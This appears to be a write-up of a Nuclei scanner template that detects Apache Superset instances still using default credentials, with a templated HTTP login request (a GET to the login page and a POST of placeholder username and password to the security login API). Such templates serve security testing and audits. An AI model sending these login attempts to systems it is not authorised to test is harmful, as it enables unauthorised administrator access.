# Nuclei Template: Apache Superset - Default Login
**Template ID:** superset-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`superset-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Superset instance discovered using weak default credentials, allows the attacker to gain admin privilege.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/login/
POST /api/v1/security/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}","provider":"db","refresh":true}
```

## References
- https://superset.apache.org/
